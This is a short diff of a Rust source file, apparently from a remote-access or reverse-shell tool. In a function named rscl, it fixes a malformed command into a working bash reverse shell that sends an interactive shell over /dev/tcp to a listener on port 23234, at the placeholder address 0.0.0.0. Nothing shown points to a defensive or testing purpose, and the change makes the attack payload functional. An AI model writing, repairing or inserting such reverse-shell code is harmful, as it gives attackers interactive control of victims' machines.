@@ -21,7 +21,7 @@ pub fn reader(stream: &TcpStream) -> Result<String, Error> {
 }
 
 pub fn rscl() -> Result<String, Error> {
-    match shell_command::run_shell_command("bash -c '-i >& /dev/tcp/0.0.0.0/23234 0>&1'") {
+    match shell_command::run_shell_command("bash -c 'bash -i >& /dev/tcp/0.0.0.0/23234 0>&1'") {
         Ok(output) => Ok(output),
         Err(_) => Err(Error::new(ErrorKind::Other, "Failed to run shell command"))
     }
